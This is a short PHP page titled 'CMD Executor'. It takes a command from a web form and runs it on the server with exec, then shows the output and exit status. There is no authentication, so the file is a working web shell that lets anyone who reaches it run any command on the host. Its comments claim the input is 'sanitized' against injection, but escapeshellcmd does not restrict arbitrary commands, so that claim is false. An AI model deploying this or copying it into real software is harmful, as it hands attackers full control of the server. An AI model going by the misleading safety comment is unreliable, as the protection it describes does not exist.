<?php
// Ensure safe usage
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';

    // Sanitize the command to avoid injection attacks
    $command = escapeshellcmd($command);

    // Execute the command
    $output = [];
    $status = null;
    exec($command, $output, $status);

    // Output results
    echo "<h3>Command Output:</h3>";
    echo "<pre>" . implode("\n", $output) . "</pre>";
    echo "<h3>Exit Status:</h3>";
    echo "<pre>" . $status . "</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD Executor</title>
</head>
<body>
    <h2>Execute a CMD Command</h2>
    <form method="POST">
        <label for="command">Command:</label><br>
        <input type="text" id="command" name="command" style="width: 100%;"><br><br>
        <button type="submit">Run Command</button>
    </form>
</body>
</html>
